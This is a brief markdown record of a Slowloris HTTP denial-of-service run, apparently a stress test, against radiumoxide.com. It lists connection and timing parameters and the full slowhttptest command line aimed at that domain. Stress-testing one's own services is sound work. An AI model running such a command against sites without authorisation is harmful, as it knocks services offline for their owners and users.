# Attack Results

## Description

- Type: Slow Loris HTTP
- Number of attackers: 1
- Target port: 80
- Number of connections: 1000
- Generated statistics to file: `slowhttp1`
- Number of requests: 200
- Type of requests: HTTP GET
- Wait for data: 10 seconds
- Request length: 24 bytes
- Request timeout: 3 seconds
- Target: radiumoxide.com
- Attack tool: slowhttptest
- Attack Command: `slowhttptest -c 1000 -H -g -o slowhttp1 -i 10 -r 200 -t GET -u https://radiumoxide.com -x 24 -p 3`

